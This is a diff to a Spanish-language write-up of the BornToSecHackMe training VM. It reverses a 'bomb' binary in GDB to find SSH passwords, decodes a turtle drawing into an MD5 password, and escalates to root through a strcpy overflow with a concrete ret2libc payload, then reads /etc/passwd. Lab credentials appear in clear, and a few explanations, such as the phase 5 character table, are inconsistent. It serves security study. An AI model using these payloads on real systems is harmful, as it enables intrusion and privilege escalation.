@@ -1,9 +1,5 @@
 # Writeup 1 - Raiders of the Lost Ark (En busca del arca perdida)
 
-## Writeups Map
-
-![map](img/map.png)
-
 ## Índice:
 
 - [1. Encontrar la IP](#1-encontrar-la-ip)
@@ -14,8 +10,14 @@
 - [6. Logging en el foro](#6-logging-en-el-foro)
 - [7. Iniciar sesión en Phpmyadmin](#7-iniciar-sesión-en-phpmyadmin)
 - [8. Acceso SSH como laurie](#8-acceso-ssh-como-laurie)
-- [9. Análisis del binario](#9-análisis-del-binario)
-- [10. Password exploit](#10-passwords-exploit)
+- [9. Análisis del binario y assword exploit](#9-análisis-del-binario-y-passwords-exploit)
+- [10. Ejecutamos el binario bomb](#10-ejecutamos-el-binario-bomb)
+- [11. Acceso SSH como thor](#11-acceso-ssh-como-thor)
+- [12. Python Draw](#12-python-draw)
+- [13. Acceso SSH como zaz](#13-acceso-ssh-como-zaz)
+- [14. Calcular el offset y payload](#14-calcular-el-offset-y-payload)
+- [15. Construir el payload](#15-construir-el-payload)
+- [16. Conclusión del Writeup 1](#16-conclusión-del-writeup-1)
 
 
 ## Explotación
@@ -752,7 +754,6 @@ analizar cada etapa del binario con GDB:
 - `o`  → la etapa 5 tiene una solución que contiene la letra `o`
 - `4`  → la etapa 4 acepta un número relacionado con el `4`
 
-## 9. Análisis del binario
 
 **Recordatorio:**
 
@@ -762,7 +763,7 @@ El subject dice:
 
 Es decir hay que intercambiar los dos últimos caracteres de la contraseña final.
 
-## 10. Passwords exploit
+## 9. Análisis del binario y Passwords exploit
 
 Desensamblamos con GDB y listamos las funciones:
 ```bash
@@ -812,7 +813,7 @@ End of assembler dump.
 (gdb) x/s 0x80497c0
 0x80497c0:	 "Public speaking is very easy."
 ```
-### `**Password Phase 1: Public speaking is very easy.**`
+### **`Password Phase 1: Public speaking is very easy.`**
 
 2. El análisis del desensamblado de la función `phase_2` nos dice el tipo de retorno es un `int ()`:
 - lee 6 números.
@@ -905,7 +906,7 @@ array[5] = 120 * 6 = 720
 ```
 
 Coincide con la pista 2 del README.
-### `**Password Phase 2: 1 2 6 24 120 720**`
+### **`Password Phase 2: 1 2 6 24 120 720`**
 
 3. En el análisis de la función `phase_3` el formato `"%d %c %d"` nos dice que la funciñon espera 3 valores: **número, carácter, número**.
 ```
@@ -949,4 +950,541 @@ case 7 → 0x08048c76 → bl=0x62('b'), número=0x20c=524
 ```
 
 Coincide con la pista 3 del README cualquier caso con b funciona.
-### `**Password Phase 3: 1 b 214**`
+### **`Password Phase 3: 1 b 214`**
+
+4. En el análisis de la función `phase_4`, vemos que lee un único número con `sscanf` usando el formato `"%d"` y lo pasa a `func4`. El resultado debe ser `0x37 = 55`:
+
+```bash
+(gdb) x/s 0x8049808
+0x8049808:	 "%d"
+```
+
+```asm
+<+61>: cmp eax, 0x37     ← func4(n) debe devolver 55
+<+64>: je  phase_4+71    ← si no, explota
+```
+
+`func4` es una función recursiva — se llama a sí misma con `n-1` y `n-2`
+y suma los resultados. Es la **secuencia de Fibonacci**:
+
+```asm
+<+11>: cmp ebx, 0x1
+<+14>: jle func4+48      ← caso base: si n <= 1 devuelve 1
+<+23>: call func4        ← func4(n-1)
+<+37>: call func4        ← func4(n-2)
+<+42>: add eax, esi      ← devuelve func4(n-1) + func4(n-2)
+```
+
+Calculamos la secuencia hasta encontrar el índice que devuelve `55`:
+
+```
+func4(1)  = 1
+func4(2)  = 2
+func4(3)  = 3
+func4(4)  = 5
+func4(5)  = 8
+func4(6)  = 13
+func4(7)  = 21
+func4(8)  = 34
+func4(9)  = 55  ← coincide con 0x37
+```
+
+La pista del README es `4` — hace referencia al número `4` que aparece
+en el índice `9` de la secuencia (el cuarto primo de Fibonacci mayor que 1).
+
+### **`Password Phase 4: 9`**
+
+5. El análisis de la función `phase_5` verifica que el string introducido tenga exactamente **6 caracteres**:
+
+```asm
+<+23>: cmp eax, 0x6    ← longitud debe ser 6
+<+28>: call explode_bomb
+```
+
+Luego construye un nuevo string de 6 caracteres usando cada carácter del input como índice en el array `array.123`:
+
+```asm
+<+46>: and al, 0xf          ← coge los últimos 4 bits del carácter
+<+51>: mov al, [eax+esi*1]  ← usa esos 4 bits como índice en array.123
+```
+
+El array es:
+```
+array.123 = "isrveawhobpnutfg"
+índice:      0123456789abcdef
+```
+
+El resultado debe ser igual a `"giants"`:
+```
+g → índice 15 (0xf) → necesitamos un carácter cuyo último nibble sea f → 'o' (0x6f) u 'O' (0x4f)
+i → índice  0 (0x0) → 'p' (0x70) o 'P' (0x50)
+a → índice  5 (0x5) → 'e' (0x65) o 'E' (0x45)
+n → índice 13 (0xd) → 'm' (0x6d) o 'M' (0x4d)  (0xd = 13)
+t → índice 11 (0xb) → 'k' (0x6b) o 'K' (0x4b)  (0xb = 11)
+s → índice  2 (0x2) → 'r' (0x72) o 'R' (0x52)
+```
+
+La pista del README es `o` — corresponde al primer carácter con índice `f`.
+Una solución válida es `opekmq`.
+
+### **`Password Phase 5: opekmq`**
+
+6. El análisis de la función `phase_6` es el más complejo. Lee **6 números** con `read_six_numbers` y aplica tres verificaciones:
+
+**Verificación 1 — valores entre 1 y 6:**
+```asm
+<+46>: dec eax
+<+47>: cmp eax, 0x5
+<+50>: jbe phase_6+57    ← si (valor-1) <= 5 continúa, es decir valor <= 6
+<+52>: call explode_bomb
+```
+
+**Verificación 2 — sin duplicados:**
+```asm
+<+84>: cmp eax, [esi+ebx*4]   ← compara cada número con los siguientes
+<+87>: jne phase_6+94         ← si son iguales explota
+<+89>: call explode_bomb
+```
+
+**Verificación 3 — linked list ordenada:**
+
+La dirección `0x804b26c` apunta a una **linked list** de 6 nodos. Cada nodo
+tiene un valor y un puntero al siguiente. Los números introducidos se usan
+como índices para reordenar los nodos de la lista:
+
+```asm
+<+120>: mov esi, [ebp-0x34]   ← puntero al primer nodo
+<+152>: mov esi, [esi+0x8]    ← avanza al siguiente nodo
+```
+
+Una vez reordenada la lista, verifica que los valores estén en **orden
+descendente**:
+
+```asm
+<+221>: cmp eax, [edx]        ← nodo actual debe ser >= nodo siguiente
+<+223>: jge phase_6+230
+<+225>: call explode_bomb
+```
+
+Necesitamos conocer los valores de cada nodo. Los inspeccionamos en GDB:
+
+```bash
+(gdb) x/24wx 0x804b26c
+0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260	0x000003e9
+0x804b27c <n48+4>:	0x00000000	0x00000000	0x0000002f	0x00000000
+0x804b28c <n46+8>:	0x00000000	0x00000014	0x00000000	0x00000000
+0x804b29c <n42>:	0x00000007	0x00000000	0x00000000	0x00000023
+0x804b2ac <n44+4>:	0x00000000	0x00000000	0x00000063	0x00000000
+0x804b2bc <n47+8>:	0x00000000	0x00000001	0x00000000	0x00000000
+```
+El formato de la memoria no es claro con ese comando. Necesitamos ver los nodos correctamente — cada nodo tiene valor (4 bytes) + índice (4 bytes) + siguiente (4 bytes):
+
+```bash
+(gdb) x/3wx 0x804b26c
+0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260
+(gdb) x/3wx 0x804b260
+0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b254
+(gdb) x/3wx 0x804b254
+0x804b254 <node3>:	0x0000012d	0x00000003	0x0804b248
+(gdb)  x/3wx 0x804b248
+0x804b248 <node4>:	0x000003e5	0x00000004	0x0804b23c
+(gdb)  x/3wx 0x804b23c
+0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b230
+(gdb) x/3wx 0x804b230
+0x804b230 <node6>:	0x000001b0	0x00000006	0x00000000
+```
+
+Con esta info ya tenemos todos los nodos:
+```
+node1: valor=0x0fd=253,  índice=1
+node2: valor=0x2d5=725,  índice=2
+node3: valor=0x12d=301,  índice=3
+node4: valor=0x3e5=997,  índice=4
+node5: valor=0x0d4=212,  índice=5
+node6: valor=0x1b0=432,  índice=6
+```
+
+Para que la lista quede en **orden descendente** necesitamos ordenar por valor de mayor a menor:
+```
+997  → node4 → índice 4
+725  → node2 → índice 2
+432  → node6 → índice 6
+301  → node3 → índice 3
+253  → node1 → índice 1
+212  → node5 → índice 5
+```
+
+### **`Password Phase 6: 4 2 6 3 1 5`**
+
+## 10. Ejecutamos el binario bomb
+
+Ahora que disponemos del password de todas las etapas, ejecutamos el binario y comprobamos:
+```bash
+laurie@BornToSecHackMe:~$ ./bomb 
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+1 2 6 24 120 720
+That's number 2.  Keep going!
+1 b 214
+Halfway there!
+9
+So you got that one.  Try this one.
+opekmq
+Good work!  On to the next...
+4 2 6 3 1 5
+Congratulations! You've defused the bomb!
+```
+
+## 11. Acceso SSH como thor
+
+Hemos comprobado que las contraseñas de las etapas son correctas.
+
+La contraseña de `thor` se forma concatenando todas sin espacios y aplicando la regla del subject — intercambiar los dos últimos caracteres:
+
+```
+Phase 1: Publicspeakingisveryeasy.
+Phase 2: 12624120720
+Phase 3: 1b214
+Phase 4: 9
+Phase 5: opekmq
+Phase 6: 426315
+```
+
+Concatenado: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+```bash
+laurie@BornToSecHackMe:~$ ssh thor@192.168.0.30
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+thor@192.168.0.30's password:
+thor@BornToSecHackMe:~$
+```
+
+Una vez que hemos iniciado sesión como Thor y listamos el directorio principal encontramos dos archivos — `READEM` y `turtle`:
+```bash
+thor@BornToSecHackMe:~$ ls -la
+total 41
+drwxr-x--- 1 thor     thor    60 Oct 15  2015 .
+drwxrwx--x 1 www-data root   100 Oct 13  2015 ..
+-rwxr-x--- 1 thor     thor     6 Apr 24 01:58 .bash_history
+-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
+drwx------ 2 thor     thor    43 Oct 15  2015 .cache
+-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
+-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
+-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
+```
+### README:
+```bash
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+```
+
+### turtle:
+```bash
+thor@BornToSecHackMe:~$ cat turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+[...]
+Avance 100 spaces
+Recule 200 spaces
+Avance 100 spaces
+Tourne droite de 90 degrees
+Avance 100 spaces
+Tourne droite de 90 degrees
+Avance 100 spaces
+Recule 200 spaces
+
+Can you digest the message? :)
+```
+
+El nombre "turtle" hace referencia al módulo `turtle` de Python. Este módulo permite dibujar figuras mediante instrucciones dadas en un programa Python.
+
+## 12. Python Draw
+
+Necesitamos convertir las instrucciones dadas a código Python y ejecutarlo.
+
+El archivo `turtle` necesita ejecutarse en nuestro host porque la VM no tiene entorno gráfico. Descarga el archivo primero, creamos el programa en python y lo ejecutamos.
+
+En nuestro host:
+```bash
+scp thor@192.168.0.30:~/turtle /tmp/turtle.txt
+```
+
+```bash
+scp thor@192.168.0.30:~/turtle /tmp/turtle.txt
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+thor@192.168.0.30's password: 
+turtle                                                      100%   31KB  18.3MB/s   00:00    
+```
+
+Creamos `draw.py`:
+```bash
+cat > /tmp/draw.py << 'EOF'
+import turtle
+import re
+
+t = turtle.Turtle()
+t.speed(0)
+screen = turtle.Screen()
+
+with open('/tmp/turtle.txt', 'r') as f:
+    for line in f:
+        line = line.strip()
+        
+        m = re.match(r'Avance (\d+) spaces', line)
+        if m:
+            t.forward(int(m.group(1)))
+            continue
+        
+        m = re.match(r'Recule (\d+) spaces', line)
+        if m:
+            t.backward(int(m.group(1)))
+            continue
+        
+        m = re.match(r'Tourne gauche de (\d+) degrees', line)
+        if m:
+            t.left(int(m.group(1)))
+            continue
+        
+        m = re.match(r'Tourne droite de (\d+) degrees', line)
+        if m:
+            t.right(int(m.group(1)))
+            continue
+
+turtle.done()
+EOF
+```
+
+Y ejecutamos:
+```bash
+python3 /tmp/draw.py
+```
+
+En la imagen se ven las letras `SLASH` dibujadas. Ahora aplicamos `MD5`:
+
+![Turtle Draw](img/python_tutle.png)
+
+```bash
+thor@BornToSecHackMe:~$ echo -n "SLASH" | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e  -
+```
+
+Esta es la contraseña del usuario `zaz`
+```text
+Usuario: zaz
+Pasword: 646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+## 13. Acceso SSH como zaz
+
+Accedemos con el usuairo `zaz` y realizamos un listado a ver que encontamos:
+```bash
+thor@BornToSecHackMe:~$ ssh zaz@192.168.0.30
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.0.30's password: 
+zaz@BornToSecHackMe:~$ ls -la
+total 12
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 1 www-data root  100 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me        ←  Ejecutable como root
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+```
+
+Una rápida inspección del hmoe nos muestra un archivo binario llamado `exploit_me` que se ejecutará como usuario root.
+
+Si logramos generar una consola usando este binario, tendremos permisos de root.
+
+En primer lugar, listamos todas las funciones usando GDB y vemos que solo hay una función -> `main()`
+
+```bash
+(gdb) info functions 
+All defined functions:
+
+[...]
+0x080483f4  main
+[...]
+```
+
+Desensamblamos `main()`:
+
+```asm
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	    push   ebp
+   0x080483f5 <+1>:	    mov    ebp,esp
+   0x080483f7 <+3>:	    and    esp,0xfffffff0
+   0x080483fa <+6>:	    sub    esp,0x90
+   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    eax,0x1
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048410 <+28>:	add    eax,0x4
+   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
+   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048419 <+37>:	lea    eax,[esp+0x10]
+   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    eax,[esp+0x10]
+   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    eax,0x0
+   0x08048436 <+66>:	leave  
+   0x08048437 <+67>:	ret    
+End of assembler dump.
+```
+
+- `<+6>`: Reserva `0x90` (144) bytes en el stack — el buffer `dest` tiene **128 bytes** útiles (144 - 16 bytes de alineación).
+- `<+12>` y `<+16>`: Comprueba que `argc > 1` — si no hay argumento sale con `return 1`.
+- `<+28>` a `<+31>`: Carga `argv[1]` — el argumento que pasamos al binario.
+- `<+44>`: Llama a `strcpy(dest, argv[1])` — copia `argv[1]` en el buffer **sin comprobar
+  el tamaño**. Si el argumento supera los 128 bytes desbordamos el buffer y
+  sobrescribimos el `EIP`.
+- `<+56>`: Llama a `puts(dest)` — imprime el contenido del buffer.
+
+El vector de ataque es un **Stack Buffer Overflow** clásico mediante `Ret2Libc` —
+el mismo que usamos en el `level07` de OverRide. Necesitamos:
+
+1. Localizar las direcciones de `system()`, `exit()` y `/bin/sh` en la libc.
+2. Calcular el offset exacto hasta el `EIP`.
+3. Construir el payload: `padding + system() + exit() + /bin/sh`.
+
+## 14. Calcular el offset
+
+Localizamos las direcciones:
+```bash
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r test
+Starting program: /home/zaz/exploit_me test
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) info proc map
+process 4317
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) 
+```
+
+Tenemos `system` y `exit`. Ahora buscamos `/bin/sh` en la libc:
+```bash
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+Tenemos todo. Ahora calculamos el offset hasta el EIP -> el buffer es de 128 bytes más 4 bytes de EBP guardado = 140 bytes de padding:
+```bash
+(gdb) r $(python -c "print 'A' * 140 + 'BBBB'")
+```
+
+Si `EIP` vale `0x42424242` el offset es correcto:
+```bash
+(gdb) r $(python -c "print 'A' * 140 + 'BBBB'")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/zaz/exploit_me $(python -c "print 'A' * 140 + 'BBBB'")
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) 
+```
+
+`EIP` vale `0x42424242` -> el offset de 140 bytes es correcto.
+
+## 15. Construir el payload
+
+Construimos el payload con las direcciones que tenemos:
+```text
+system():  0xb7e6b060
+exit():    0xb7e5ebe0
+/bin/sh:   0xb7f8cc58
+```
+**padding (140 bytes) + system() + exit() + /bin/sh**
+
+Y ejecutamos:
+
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'")
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# whoami
+root
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# cat /etc/passwd | grep root
+root:x:0:0:root:/root:/bin/bash
+ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
+```
+
+## 16. Conclusión del Writeup 1
+
+El writeup 1 sigue una cadena de explotación en 14 pasos que va desde el
+descubrimiento de la IP hasta la obtención de root:
+
+```
+Reconocimiento → Foro → Webmail → phpMyAdmin → Webshell →
+www-data → FTP → laurie → Bomb → thor → Turtle → zaz → ROOT
+```
+
+Cada paso aprovecha una vulnerabilidad o información filtrada por el paso anterior, credenciales expuestas en logs, contraseñas en archivos del sistema, inyección SQL para crear un webshell, y finalmente un Stack Buffer Overflow con Ret2LibC para escalar a root.
+
